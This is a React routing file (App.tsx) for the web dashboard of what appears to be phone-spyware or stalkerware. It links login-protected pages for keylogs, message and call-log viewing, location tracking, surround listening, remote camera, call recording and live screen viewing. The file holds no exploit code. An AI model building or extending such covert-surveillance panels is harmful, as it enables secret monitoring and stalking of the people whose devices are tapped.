import { BrowserRouter as Router, Routes, Route, Navigate } from 'react-router-dom';
import { AuthProvider, useAuth } from './contexts/AuthContext';
import { ThemeProvider } from './contexts/ThemeContext';
import { ToastProvider } from './contexts/ToastContext';
import { AuthPage } from './components/AuthPage';
import { Layout } from './components/Layout';
import { DashboardHome } from './components/dashboard/DashboardHome';
import { LocationTracking } from './components/dashboard/LocationTracking';
import { MessagesView } from './components/dashboard/MessagesView';
import { CallLogsView } from './components/dashboard/CallLogsView';
import { AppUsageView } from './components/dashboard/AppUsageView';
import { KeylogsView } from './components/dashboard/KeylogsView';
import { BrowserHistoryView } from './components/dashboard/BrowserHistoryView';
import { MediaGallery } from './components/dashboard/MediaGallery';
import { SettingsView } from './components/dashboard/SettingsView';
import { SurroundListening } from './components/dashboard/SurroundListening';
import { RemoteCamera } from './components/dashboard/RemoteCamera';
import { CallRecorder } from './components/dashboard/CallRecorder';
import { ScreenshotsView } from './components/dashboard/ScreenshotsView';
import { LiveScreen } from './components/dashboard/LiveScreen';
import { AlertsView } from './components/dashboard/AlertsView';
import { AdminPanel } from './components/admin/AdminPanel';
import { ReactNode } from 'react';

function ProtectedRoute({ children }: { children: ReactNode }) {
  const { user, loading } = useAuth();

  if (loading) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-gray-50 dark:bg-slate-900">
        <div className="w-8 h-8 border-4 border-emerald-500 border-t-transparent rounded-full animate-spin" />
      </div>
    );
  }

  if (!user) {
    return <Navigate to="/" replace />;
  }

  return <>{children}</>;
}

function AppRoutes() {
  const { user, loading } = useAuth();

  if (loading) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-gray-50 dark:bg-slate-900">
        <div className="w-8 h-8 border-4 border-emerald-500 border-t-transparent rounded-full animate-spin" />
      </div>
    );
  }

  return (
    <Routes>
      <Route path="/" element={user ? <Navigate to="/dashboard" replace /> : <AuthPage />} />
      <Route
        path="/dashboard"
        element={
          <ProtectedRoute>
            <Layout />
          </ProtectedRoute>
        }
      >
        <Route index element={<DashboardHome />} />
        <Route path="location" element={<LocationTracking />} />
        <Route path="messages" element={<MessagesView />} />
        <Route path="calls" element={<CallLogsView />} />
        <Route path="apps" element={<AppUsageView />} />
        <Route path="keylogs" element={<KeylogsView />} />
        <Route path="browser" element={<BrowserHistoryView />} />
        <Route path="media" element={<MediaGallery />} />
        <Route path="settings" element={<SettingsView />} />
        <Route path="surround-listening" element={<SurroundListening />} />
        <Route path="remote-camera" element={<RemoteCamera />} />
        <Route path="call-recorder" element={<CallRecorder />} />
        <Route path="screenshots" element={<ScreenshotsView />} />
        <Route path="live-screen" element={<LiveScreen />} />
        <Route path="alerts" element={<AlertsView />} />
      </Route>
      <Route
        path="/admin"
        element={
          <ProtectedRoute>
            <Layout />
          </ProtectedRoute>
        }
      >
        <Route index element={<AdminPanel />} />
      </Route>
    </Routes>
  );
}

function App() {
  return (
    <Router>
      <ThemeProvider>
        <AuthProvider>
          <ToastProvider>
            <AppRoutes />
          </ToastProvider>
        </AuthProvider>
      </ThemeProvider>
    </Router>
  );
}

export default App;
